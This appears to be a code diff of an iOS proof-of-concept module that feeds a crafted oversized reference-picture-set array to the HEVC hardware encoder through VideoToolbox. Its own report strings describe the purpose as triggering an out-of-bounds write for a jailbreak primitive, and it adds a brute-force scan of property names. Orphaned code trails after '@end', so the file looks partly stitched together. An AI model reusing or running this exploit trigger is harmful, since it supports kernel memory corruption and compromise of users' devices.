@@ -3,7 +3,6 @@
 #import "KPLog.h"
 #import <VideoToolbox/VideoToolbox.h>
 #import <CoreMedia/CoreMedia.h>
-#import <dlfcn.h>
 
 @interface KPH9EncoderModule ()
 @property (nonatomic, copy) NSString *identifier;
@@ -45,56 +44,51 @@
     NSMutableString *report = [NSMutableString string];
     [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write ===\n"];
     [report appendString:@"AVE_HEVC_ST_RPS_Retrieve unbounded copy.\n"];
-    [report appendString:@"Calif iOS 27.0.1 jailbreak primitive.\n"];
     [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
 
     // Phase 1: create encoder session
     [report appendString:@"\n--- Phase 1: create encoder session ---\n"];
-
     VTCompressionSessionRef session = NULL;
     OSStatus status = VTCompressionSessionCreate(
-        kCFAllocatorDefault,
-        1920, 1080,
+        kCFAllocatorDefault, 1920, 1080,
         kCMVideoCodecType_HEVC,
-        NULL, NULL, NULL,
-        NULL, NULL,
-        &session
-    );
+        NULL, NULL, NULL, NULL, NULL, &session);
     [report appendFormat:@"VTCompressionSessionCreate: %d\n", (int)status];
-
     if (status != noErr || !session) {
-        [report appendString:@"encoder session FAILED\n"];
         [report appendString:@"\nVERDICT: SESSION_CREATE_FAILED\n"];
         return report;
     }
     [report appendString:@"encoder session created\n"];
 
-    // Phase 2: set UserRPSForFaceTime with crafted array
-    [report appendString:@"\n--- Phase 2: crafted UserRPSForFaceTime ---\n"];
+    // Phase 2: build RPS dictionary
+    [report appendString:@"\n--- Phase 2: build RPS ---\n"];
+    NSMutableArray *deltaArr = [NSMutableArray array];
+    for (int i = 0; i < 32; i++) [deltaArr addObject:@(0x4100 + i)];
+    NSDictionary *rpsDict = @{@"DeltaPOCS0Minus1": deltaArr};
+    [report appendFormat:@"RPS: %d entries\n", 32];
 
-    // Create DeltaPOCS0Minus1 array with count > 16 (the unbounded copy)
-    // Normal count is <= 16. We use more to trigger OOB.
-    NSMutableArray *deltaArray = [NSMutableArray array];
-    int32_t rpsCount = 32;  // > 16 triggers OOB
-
-    for (int i = 0; i < rpsCount; i++) {
-        // Each entry is a 16-bit value
-        int16_t val = (int16_t)(0x4100 + i);
-        [deltaArray addObject:@(val)];
+    // Phase 3: systematic property name scan
+    [report appendString:@"\n--- Phase 3: property name scan ---\n"];
+    NSArray *propKeys = @[
+        @"UserRPSForFaceTime", @"UserRPS", @"AVEUserRPSForFaceTime",
+        @"kVTCompressionPropertyKey_UserRPSForFaceTime", @"RPS",
+        @"ReferencePictureSet", @"AVE_HEVC_RPS", @"FaceTimeRPS",
+    ];
+    NSArray *propValues = @[rpsDict, @[rpsDict], deltaArr];
+    for (NSString *key in propKeys) {
+        for (id val in propValues) {
+            status = VTSessionSetProperty(session,
+                (__bridge CFStringRef)key,
+                (__bridge CFPropertyListRef)val);
+            if (status == 0) {
+                [report appendFormat:@"*** SUCCESS: %@ ***\n", key];
+            }
+        }
     }
-    [report appendFormat:@"DeltaPOCS0Minus1 array: %d entries\n", rpsCount];
+    [report appendString:@"property scan done\n"];
 
-    // Build UserRPSForFaceTime dictionary
-    NSDictionary *rpsDict = @{
-        @"DeltaPOCS0Minus1": deltaArray,
-        @"DeltaPOCS1Minus1": @[@0],
-    };
-
-    // UserRPSForFaceTime is a FRAME PROPERTY, not session property
-    // Pass it during encode via frameProperties
-    [report appendString:@"\n--- Phase 2b: encode with UserRPSForFaceTime ---\n"];
-
-    // Create pixel buffer
+    // Phase 4: encode with frame properties
+    [report appendString:@"\n--- Phase 4: encode with frame properties ---\n"];
     CVPixelBufferRef pb = NULL;
     CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
                          kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
@@ -104,107 +98,32 @@
         memset(CVPixelBufferGetBaseAddress(pb), 0x80, CVPixelBufferGetDataSize(pb));
         CVPixelBufferUnlockBaseAddress(pb, 0);
 
-        // Frame properties with UserRPSForFaceTime
-        NSDictionary *frameProps = @{
-            @"UserRPSForFaceTime": rpsDict,
-        };
-
+        NSDictionary *frameProps = @{@"UserRPSForFaceTime": rpsDict};
         VTEncodeInfoFlags flags = 0;
         CMTime pts = CMTimeMake(0, 30);
         CMTime dur = CMTimeMake(1, 30);
 
         status = VTCompressionSessionEncodeFrame(
             session, pb, pts, dur,
-            (__bridge CFDictionaryRef)frameProps,
-            NULL,  // sourceFrameRefcon
-            &flags  // infoFlagsOut
-        );
-        [report appendFormat:@"encode with RPS: %d (flags=0x%x)\n", (int)status, flags];
+            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
+        [report appendFormat:@"encode: %d (flags=0x%x)\n", (int)status, flags];
 
-        // Encode second frame (triggers FPS::Add through overwritten pointer)
         pts = CMTimeMake(1, 30);
         status = VTCompressionSessionEncodeFrame(
             session, pb, pts, dur,
-            (__bridge CFDictionaryRef)frameProps,
-            NULL, &flags
-        );
+            (__bridge CFDictionaryRef)frameProps, NULL, &flags);
         [report appendFormat:@"encode[1]: %d\n", (int)status];
 
         CVPixelBufferRelease(pb);
     }
+
+    // Cleanup
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    VTCompressionSessionInvalidate(session);
+    CFRelease(session);
+
+    [report appendString:@"\nVERDICT: H9_RECON_COMPLETE\n"];
     return report;
 }
 
-@end    // Systematic property name scan (RE approach)
-    [report appendString:@"\n--- Phase 2: property name scan ---\n"];
-
-    NSMutableArray *deltaArr = [NSMutableArray array];
-    for (int i = 0; i < 32; i++) [deltaArr addObject:@(0x4100 + i)];
-    NSDictionary *rpsInner = @{@"DeltaPOCS0Minus1": deltaArr};
-
-    // Try many property name formats
-    NSArray *propKeys = @[
-        @"UserRPSForFaceTime",
-        @"UserRPS",
-        @"AVEUserRPSForFaceTime",
-        @"AVE.UserRPSForFaceTime",
-        @"kVTCompressionPropertyKey_UserRPSForFaceTime",
-        @"H9UserRPSForFaceTime",
-        @"RPS",
-        @"ReferencePictureSet",
-        @"AVE_HEVC_RPS",
-        @"AVE_ST_RPS",
-        @"FaceTimeRPS",
-    ];
-
-    // Try different value formats
-    NSArray *propValues = @[
-        rpsDict,           // dictionary with DeltaPOCS0Minus1
-        @[rpsDict],        // array of dictionaries
-        deltaArr,          // raw array
-    ];
-
-    for (NSString *key in propKeys) {
-        for (id val in propValues) {
-            status = VTSessionSetProperty(session,
-                (__bridge CFStringRef)key,
-                (__bridge CFPropertyListRef)val);
-            if (status == 0) {
-                [report appendFormat:@"*** SUCCESS: %@ = %@ ***\n", key, val];
-            } else {
-                [report appendFormat:@"fail %d: %@\n", (int)status, key];
-            }
-        }
-    }
-
-    // Also try setting as frame property during encode
-    [report appendString:@"\n--- Phase 2b: frame property scan ---\n"];
-    {
-        CVPixelBufferRef pb2 = NULL;
-        CVPixelBufferCreate(kCFAllocatorDefault, 1920, 1080,
-                             kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
-                             NULL, &pb2);
-        if (pb2) {
-            CVPixelBufferLockBaseAddress(pb2, 0);
-            memset(CVPixelBufferGetBaseAddress(pb2), 0x80, CVPixelBufferGetDataSize(pb2));
-            CVPixelBufferUnlockBaseAddress(pb2, 0);
-
-            for (NSString *key in propKeys) {
-                NSDictionary *fp = @{key: rpsDict};
-                VTEncodeInfoFlags fl = 0;
-                CMTime p = CMTimeMake(0, 30);
-                CMTime d = CMTimeMake(1, 30);
-                status = VTCompressionSessionEncodeFrame(
-                    session, pb2, p, d,
-                    (__bridge CFDictionaryRef)fp, NULL, &fl);
-                [report appendFormat:@"frame %@: %d\n", key, (int)status];
-                if (status == 0) {
-                    [report appendFormat:@"*** FRAME PROP SUCCESS: %@ ***\n", key];
-                    break;
-                }
-            }
-            CVPixelBufferRelease(pb2);
-        }
-    }
-
-
+@end
